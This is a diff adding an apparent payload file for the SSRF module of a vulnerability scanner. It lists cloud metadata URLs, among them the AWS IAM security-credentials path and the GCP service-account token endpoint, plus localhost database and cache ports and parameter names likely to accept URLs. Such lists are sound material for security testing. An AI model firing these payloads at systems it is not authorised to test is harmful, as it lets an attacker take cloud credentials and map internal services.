@@ -1,0 +1,82 @@
+# Server-Side Request Forgery (SSRF) payloads.
+# Module: scanner/modules/ssrf.py
+
+# Cloud metadata endpoints — signatures confirm successful fetch
+cloud_payloads:
+  - url: "http://169.254.169.254/latest/meta-data/"
+    signatures: ["ami-id", "instance-id", "instance-type"]
+    label: "AWS IMDS v1"
+  - url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+    signatures: ["AccessKeyId", "SecretAccessKey"]
+    label: "AWS IAM credentials"
+  - url: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+    signatures: ["compute", "vmId", "subscriptionId"]
+    label: "Azure IMDS"
+  - url: "http://metadata.google.internal/computeMetadata/v1/"
+    signatures: ["computeMetadata", "project", "instance"]
+    label: "GCP metadata"
+  - url: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
+    signatures: ["access_token", "token_type"]
+    label: "GCP service account token"
+  - url: "http://100.100.100.200/latest/meta-data/"
+    signatures: ["instance-id", "ami-id"]
+    label: "Alibaba Cloud IMDS"
+  - url: "http://169.254.169.254/latest/user-data"
+    signatures: ["#!/", "cloud-init", "#cloud-config"]
+    label: "AWS user-data"
+
+# Internal services — no signatures needed (HTTP 200 with content = candidate)
+internal_payloads:
+  - url: "http://127.0.0.1/"
+    signatures: ~
+    label: "localhost"
+  - url: "http://localhost/"
+    signatures: ~
+    label: "localhost"
+  - url: "http://0.0.0.0/"
+    signatures: ~
+    label: "all-interfaces"
+  - url: "http://127.0.0.1:8080/"
+    signatures: ~
+    label: "localhost:8080"
+  - url: "http://127.0.0.1:9200/"
+    signatures: ["elasticsearch", "cluster_name"]
+    label: "Elasticsearch"
+  - url: "http://127.0.0.1:6379/"
+    signatures: ["-ERR", "+PONG"]
+    label: "Redis"
+  - url: "http://127.0.0.1:27017/"
+    signatures: ["mongod", "MongoDB"]
+    label: "MongoDB"
+  - url: "http://127.0.0.1:5984/"
+    signatures: ["couchdb", "CouchDB"]
+    label: "CouchDB"
+  - url: "http://127.0.0.1:3306/"
+    signatures: ["mysql", "MariaDB"]
+    label: "MySQL"
+  - url: "http://127.0.0.1:5432/"
+    signatures: ["postgresql", "PostgreSQL"]
+    label: "PostgreSQL"
+
+# URL params that suggest SSRF entry points
+ssrf_params:
+  - url
+  - redirect
+  - next
+  - src
+  - href
+  - image
+  - uri
+  - path
+  - dest
+  - target
+  - fetch
+  - load
+  - file
+  - link
+  - proxy
+  - callback
+  - return
+  - returnurl
+  - goto
+  - forward
